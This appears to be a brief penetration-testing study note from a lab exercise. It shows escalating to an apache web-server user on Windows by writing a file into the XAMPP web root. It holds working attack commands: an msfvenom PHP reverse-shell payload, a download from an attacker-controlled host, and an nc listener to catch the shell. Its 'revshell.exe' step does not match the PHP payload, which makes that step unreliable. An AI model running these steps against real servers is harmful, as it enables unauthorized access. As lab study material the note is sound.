


## Web server upload piv esc

### Remeber to look for ways to upload files to web server once inside the machine
### Can lead to PE through the web user!

- When we have gotten initial access we can try to escalate our privs to the user of the web server
	- Example from a windows machine with an apache user


```bash

# Found an apache user
net user
	apache
	
# Does not have access to their folders

# But have write access to the root webserver dir
cd C:\xampp\htdocs
echo "test" > test.php
ls
	-a----         9/9/2024   1:58 AM             14 test.php
	
# Create revshell.php
msfvenom -p php/reverse_php LHOST=192.168.45.222 LPORT=7777 -f raw -o revshell.php

# Transfer the file
iwr 192.168.45.178:80/exploits/revshell.php -outfile revshell.php

# Visit the page
sudo rlwrap nc -nvlp 7777
http://192.168.167.169/revshell.php

# Stabliize the shell
.\revshell.exe

# whoami
whoami
craft\apache

```